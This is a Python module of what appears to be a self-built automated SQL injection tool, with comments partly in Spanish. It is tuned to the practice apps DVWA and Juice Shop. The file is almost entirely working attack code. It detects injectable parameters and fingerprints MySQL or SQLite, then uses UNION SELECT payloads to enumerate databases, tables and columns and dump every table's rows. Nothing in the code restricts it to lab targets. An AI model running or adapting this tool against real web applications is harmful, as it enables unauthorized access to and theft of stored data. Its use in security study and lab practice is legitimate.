import re
from dataclasses import dataclass, field
from urllib.parse import parse_qs, urlparse

import requests

from core.injector import inject_payload
from payloads.detection import BOOLEAN_PAYLOADS, SQL_ERROR_SIGNATURES


START_MARK = "VXSTART"
END_MARK   = "VXEND"


def _vprint(enabled: bool, message: str):
    if enabled:
        print(message)


def _strip_code_blocks(text: str) -> str:
    # Vulnerable lab pages may reflect SQL in <code> blocks. We remove those
    # segments before marker parsing to avoid reading payload text as data.
    return re.sub(r"<code>.*?</code>", "", text, flags=re.IGNORECASE | re.DOTALL)


@dataclass
class ExtractionResult:
    vulnerable_parameters: list[str] = field(default_factory=list)
    payloads_used: list[str]         = field(default_factory=list)
    engine: str                      = "unknown"
    current_db: str                  = ""
    databases: list[str]             = field(default_factory=list)
    tables: dict                     = field(default_factory=dict)
    columns: dict                    = field(default_factory=dict)
    dump: dict                       = field(default_factory=dict)


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _split_csv(raw: str) -> list[str]:
    if not raw:
        return []
    return [item.strip() for item in raw.split(",") if item.strip()]


def _is_safe_identifier(value: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-z0-9_]+", value))


def _comment_for_engine(engine: str) -> str:
    return "-- -"


def _wrap_query(engine: str, query: str) -> str:
    if engine == "sqlite":
        return f"'{START_MARK}'||IFNULL(({query}),'')||'{END_MARK}'"
    return f"CONCAT('{START_MARK}',IFNULL(({query}),'{END_MARK}'),'{END_MARK}')"


# ─────────────────────────────────────────────────────────────────────────────
# Engine fingerprinting
# ─────────────────────────────────────────────────────────────────────────────

def fingerprint_engine(
    session: requests.Session,
    url: str,
    method: str,
    param: str,
    verbose: bool = False,
) -> str:
    # ── Probe 1: MySQL — information_schema ───────────────────────────────────
    mysql_probe = "1' AND (SELECT COUNT(*) FROM information_schema.tables)>=0-- -"
    try:
        _vprint(verbose, f"[verbose] Fingerprint MySQL probe: {repr(mysql_probe)}")
        r = inject_payload(session, url, method, mysql_probe, target_param=param, verbose=verbose)
        body = r.text.lower()
        has_error = any(sig in body for sig in SQL_ERROR_SIGNATURES)
        if not has_error:
            _vprint(verbose, "[verbose] Fingerprint → MySQL (information_schema sin error)")
            return "mysql"
        if "mysql" in body or "sql syntax" in body:
            _vprint(verbose, "[verbose] Fingerprint → MySQL (keyword en error)")
            return "mysql"
    except requests.RequestException as e:
        _vprint(verbose, f"[verbose] Fingerprint MySQL probe failed: {e}")

    # ── Probe 2: SQLite — sqlite_master directo ───────────────────────────────
    # Juice Shop devuelve JSON, así que buscamos el marker en el JSON.
    sqlite_marker = "VXSQLITE"
    for col_count in (1, 2, 3):
        cols = ["NULL"] * col_count
        cols[0] = f"'{sqlite_marker}'"
        sqlite_probe = "1' UNION SELECT " + ",".join(cols) + " FROM sqlite_master-- -"
        try:
            _vprint(verbose, f"[verbose] Fingerprint SQLite probe (cols={col_count}): {repr(sqlite_probe)}")
            r = inject_payload(session, url, method, sqlite_probe, target_param=param, verbose=verbose)
            body = r.text.lower()
            if sqlite_marker.lower() in body:
                _vprint(verbose, f"[verbose] Fingerprint → SQLite (marker en respuesta, cols={col_count})")
                return "sqlite"
            if "sqlite" in body or "sqlite_master" in body:
                _vprint(verbose, "[verbose] Fingerprint → SQLite (keyword)")
                return "sqlite"
            # Sin error y sin marker → la query fue válida → es SQLite
            has_error = any(sig in body for sig in SQL_ERROR_SIGNATURES)
            if not has_error:
                _vprint(verbose, f"[verbose] Fingerprint → SQLite (sin error en sqlite_master, cols={col_count})")
                return "sqlite"
        except requests.RequestException as e:
            _vprint(verbose, f"[verbose] Fingerprint SQLite probe failed: {e}")

    # ── Probe 3: keyword fallback ─────────────────────────────────────────────
    try:
        r = inject_payload(session, url, method, "'", target_param=param, verbose=verbose)
        body = r.text.lower()
        if "mysql" in body or "sql syntax" in body:
            return "mysql"
        if "sqlite" in body:
            return "sqlite"
    except requests.RequestException:
        pass

    _vprint(verbose, "[verbose] Fingerprint → unknown")
    return "unknown"


# ─────────────────────────────────────────────────────────────────────────────
# Vulnerable parameter discovery
# ─────────────────────────────────────────────────────────────────────────────

def discover_vulnerable_parameters_with_payloads(
    session: requests.Session,
    url: str,
    method: str,
    verbose: bool = False,
) -> tuple[list[str], list[str]]:
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    vulnerable: list[str] = []
    payloads: list[str]   = []

    for param in params:
        # ── Boolean-based discovery ───────────────────────────────────────────
        found = False
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            try:
                r_true  = inject_payload(session, url, method, true_payload,  target_param=param, verbose=verbose)
                r_false = inject_payload(session, url, method, false_payload, target_param=param, verbose=verbose)
                diff = abs(len(r_true.text) - len(r_false.text))
                _vprint(verbose, f"[verbose] Param '{param}' diff boolean: {diff}")
                if diff > 20:
                    vulnerable.append(param)
                    payloads.append(f"{param}: TRUE={true_payload} | FALSE={false_payload}")
                    found = True
                    break
            except requests.RequestException as e:
                _vprint(verbose, f"[verbose] Error booleano '{param}': {e}")
                continue

        if found:
            continue

        # ── Error-based fallback ──────────────────────────────────────────────
        # Cuando la app no cambia el tamaño del body (ej: JSON con error),
        # confirmamos el parámetro si un payload rompe la sintaxis SQL.
        for error_payload in ("'", "1'", '"'):
            try:
                r = inject_payload(session, url, method, error_payload, target_param=param, verbose=verbose)
                body_lower = r.text.lower()
                _vprint(verbose, f"[verbose] Param '{param}' error-fallback payload={repr(error_payload)}")
                if any(sig in body_lower for sig in SQL_ERROR_SIGNATURES):
                    vulnerable.append(param)
                    payloads.append(f"{param}: error-based trigger={repr(error_payload)}")
                    _vprint(verbose, f"[verbose] Param '{param}' confirmado via error-based fallback")
                    break
            except requests.RequestException as e:
                _vprint(verbose, f"[verbose] Error-fallback request failed para '{param}': {e}")
                continue

    return vulnerable, payloads


# ─────────────────────────────────────────────────────────────────────────────
# UNION column helpers
# ─────────────────────────────────────────────────────────────────────────────

def _detect_column_count(
    session: requests.Session,
    url: str,
    method: str,
    param: str,
    verbose: bool = False,
    max_columns: int = 12,
) -> int:
    """
    Detect column count using two complementary strategies:

    1. ORDER BY N  — fast, works when the app reflects ORDER BY errors.
       Stops at the first N that produces an SQL error signature.

    2. UNION SELECT NULL * N  — fallback for apps (e.g. Juice Shop) where
       ORDER BY always errors or never errors regardless of N.
       The first UNION that does NOT produce an error tells us N is correct.
    """
    # ── Strategy 1: ORDER BY ──────────────────────────────────────────────────
    # Only trust ORDER BY if column 1 does NOT error (meaning the app can
    # distinguish valid vs invalid ORDER BY values).
    try:
        r_base = inject_payload(session, url, method, "1' ORDER BY 1-- -",
                                target_param=param, verbose=verbose)
        base_ok = not any(sig in r_base.text.lower() for sig in SQL_ERROR_SIGNATURES)
    except requests.RequestException:
        base_ok = False

    if base_ok:
        for n in range(2, max_columns + 1):
            payload = f"1' ORDER BY {n}-- -"
            try:
                r = inject_payload(session, url, method, payload,
                                   target_param=param, verbose=verbose)
                body = r.text.lower()
                has_error = (any(sig in body for sig in SQL_ERROR_SIGNATURES)
                             or r.status_code >= 500)
                if has_error:
                    count = n - 1
                    _vprint(verbose, f"[verbose] Columnas (ORDER BY): {count}")
                    return count
            except requests.RequestException as e:
                _vprint(verbose, f"[verbose] Error ORDER BY: {e}")
                break

    # ── Strategy 2: UNION SELECT NULL*N ──────────────────────────────────────
    # Try increasing numbers of NULLs until the server accepts the UNION.
    # A successful UNION means the column count matches the original query.
    for n in range(1, max_columns + 1):
        payload = "1' UNION SELECT " + ",".join(["NULL"] * n) + "-- -"
        try:
            r = inject_payload(session, url, method, payload,
                               target_param=param, verbose=verbose)
            body = r.text.lower()
            has_error = (any(sig in body for sig in SQL_ERROR_SIGNATURES)
                         or r.status_code >= 500)
            if not has_error:
                _vprint(verbose, f"[verbose] Columnas (UNION NULL): {n}")
                return n
        except requests.RequestException as e:
            _vprint(verbose, f"[verbose] Error UNION NULL probe: {e}")
            continue

    _vprint(verbose, "[verbose] Column count fallback: 2")
    return 2


def _detect_visible_column(
    session: requests.Session,
    url: str,
    method: str,
    param: str,
    engine: str,
    column_count: int,
    verbose: bool = False,
) -> int:
    """
    Encuentra qué columna se refleja en la respuesta.
    Busca el marker tanto en HTML (DVWA: 'First name:') como en JSON (Juice Shop).
    """
    comment = _comment_for_engine(engine)
    for idx in range(column_count):
        cols = ["NULL"] * column_count
        marker = f"{START_MARK}{idx}{END_MARK}"
        cols[idx] = f"'{marker}'"
        payload = "1' UNION SELECT " + ",".join(cols) + comment
        try:
            r = inject_payload(session, url, method, payload, target_param=param, verbose=verbose)
            # DVWA refleja en HTML con "First name:"
            if re.search(rf"First\s+name:\s*{marker}", r.text):
                _vprint(verbose, f"[verbose] Columna visible (HTML DVWA): {idx}")
                return idx
            # Juice Shop / apps JSON: el marker aparece directamente en el body
            if marker in r.text:
                _vprint(verbose, f"[verbose] Columna visible (JSON/genérico): {idx}")
                return idx
        except requests.RequestException:
            continue
    return 0


def _extract_single_value(
    session: requests.Session,
    url: str,
    method: str,
    param: str,
    engine: str,
    column_count: int,
    visible_col: int,
    query: str,
    verbose: bool = False,
) -> str:
    cols = ["NULL"] * column_count
    cols[visible_col] = _wrap_query(engine, query)
    payload = "1' UNION SELECT " + ",".join(cols) + _comment_for_engine(engine)

    try:
        r = inject_payload(session, url, method, payload, target_param=param, verbose=verbose)
    except requests.RequestException as e:
        _vprint(verbose, f"[verbose] Error extrayendo valor por UNION: {e}")
        return ""

    clean_text = _strip_code_blocks(r.text)

    # Buscar el marker tanto en HTML como en JSON.
    # Algunas apps reflejan la consulta SQL en el HTML y eso puede contener
    # el payload completo (falso positivo). Tomamos el ultimo match util,
    # que suele corresponder al resultado real de la consulta.
    matches = re.findall(rf"{START_MARK}(.*?){END_MARK}", clean_text, flags=re.DOTALL)
    if not matches:
        return ""

    # Preferir valores "limpios" frente a trozos de SQL reflejado.
    for raw in reversed(matches):
        value = raw.strip()
        upper = value.upper()
        if "SELECT" in upper or "IFNULL" in upper or "UNION" in upper or "||" in value:
            continue
        return value

    # Fallback: ultimo match encontrado.
    return matches[-1].strip()


# ─────────────────────────────────────────────────────────────────────────────
# Engine-specific SQL query builders
# ─────────────────────────────────────────────────────────────────────────────

def _get_current_db_query(engine: str) -> str:
    if engine == "sqlite":
        return "SELECT 'main'"
    return "SELECT DATABASE()"


def _get_databases_query(engine: str) -> str:
    if engine == "sqlite":
        return "SELECT 'main'"
    return "SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata"


def _get_tables_query(engine: str, database_name: str) -> str:
    if engine == "sqlite":
        return (
            "SELECT GROUP_CONCAT(name,',') FROM sqlite_master "
            "WHERE type='table' AND name NOT LIKE 'sqlite_%'"
        )
    return (
        "SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
        "FROM information_schema.tables "
        f"WHERE table_schema='{database_name}'"
    )


def _get_columns_query(engine: str, database_name: str, table_name: str) -> str:
    if engine == "sqlite":
        return f"SELECT GROUP_CONCAT(name,',') FROM pragma_table_info('{table_name}')"
    return (
        "SELECT GROUP_CONCAT(column_name SEPARATOR ',') "
        "FROM information_schema.columns "
        f"WHERE table_schema='{database_name}' AND table_name='{table_name}'"
    )


def _get_dump_query(engine: str, table_name: str, columns: list[str]) -> str:
    if not columns:
        return ""
    if engine == "sqlite":
        join_expr = " || '::' || ".join(columns)
        return f"SELECT GROUP_CONCAT({join_expr},'||') FROM {table_name}"
    return (
        "SELECT GROUP_CONCAT(CONCAT_WS('::',"
        + ",".join(columns)
        + f") SEPARATOR '||') FROM {table_name}"
    )


# ─────────────────────────────────────────────────────────────────────────────
# Main extraction pipeline
# ─────────────────────────────────────────────────────────────────────────────

def run_extraction(
    session: requests.Session,
    url: str,
    method: str,
    verbose: bool = False,
) -> ExtractionResult:
    result = ExtractionResult()

    vulnerable_params, bool_payloads = discover_vulnerable_parameters_with_payloads(
        session, url, method, verbose=verbose,
    )
    result.vulnerable_parameters = vulnerable_params
    result.payloads_used.extend(bool_payloads)

    if not vulnerable_params:
        _vprint(verbose, "[verbose] No se encontraron parámetros vulnerables para extracción")
        return result

    param = vulnerable_params[0]

    # ── Engine detection ──────────────────────────────────────────────────────
    result.engine = fingerprint_engine(session, url, method, param, verbose=verbose)
    print(f"  [*] Motor detectado: {result.engine}")

    # ── Column layout ─────────────────────────────────────────────────────────
    column_count = _detect_column_count(session, url, method, param, verbose=verbose)
    visible_col  = _detect_visible_column(
        session, url, method, param, result.engine, column_count, verbose=verbose,
    )
    result.payloads_used.append(
        f"UNION probe: 1' UNION SELECT ... {_comment_for_engine(result.engine)} "
        f"(columns={column_count}, visible_col={visible_col})"
    )

    # ── Current database ──────────────────────────────────────────────────────
    current_db = _extract_single_value(
        session, url, method, param, result.engine,
        column_count, visible_col,
        _get_current_db_query(result.engine),
        verbose=verbose,
    )
    result.current_db = current_db or ("main" if result.engine == "sqlite" else "")

    # ── Database list ─────────────────────────────────────────────────────────
    db_raw = _extract_single_value(
        session, url, method, param, result.engine,
        column_count, visible_col,
        _get_databases_query(result.engine),
        verbose=verbose,
    )
    result.databases = (
        _split_csv(db_raw) if db_raw
        else (["main"] if result.engine == "sqlite" else [])
    )

    scoped_databases = result.databases or ([result.current_db] if result.current_db else [])

    # ── Tables → columns → dump (per database) ───────────────────────────────
    for db_name in scoped_databases:
        if not _is_safe_identifier(db_name):
            continue

        table_raw = _extract_single_value(
            session, url, method, param, result.engine,
            column_count, visible_col,
            _get_tables_query(result.engine, db_name),
            verbose=verbose,
        )
        tables = _split_csv(table_raw)
        result.tables[db_name] = tables

        for table in tables:
            if not _is_safe_identifier(table):
                continue

            col_raw = _extract_single_value(
                session, url, method, param, result.engine,
                column_count, visible_col,
                _get_columns_query(result.engine, db_name, table),
                verbose=verbose,
            )
            columns = [c for c in _split_csv(col_raw) if _is_safe_identifier(c)]
            table_key = f"{db_name}.{table}"
            result.columns[table_key] = columns

            dump_query = _get_dump_query(result.engine, table, columns)
            if not dump_query:
                result.dump[table_key] = []
                continue

            dump_raw = _extract_single_value(
                session, url, method, param, result.engine,
                column_count, visible_col,
                dump_query,
                verbose=verbose,
            )

            parsed_rows = []
            for row in [r for r in dump_raw.split("||") if r]:
                values = row.split("::")
                parsed_rows.append(dict(zip(columns, values)))
            result.dump[table_key] = parsed_rows

    return result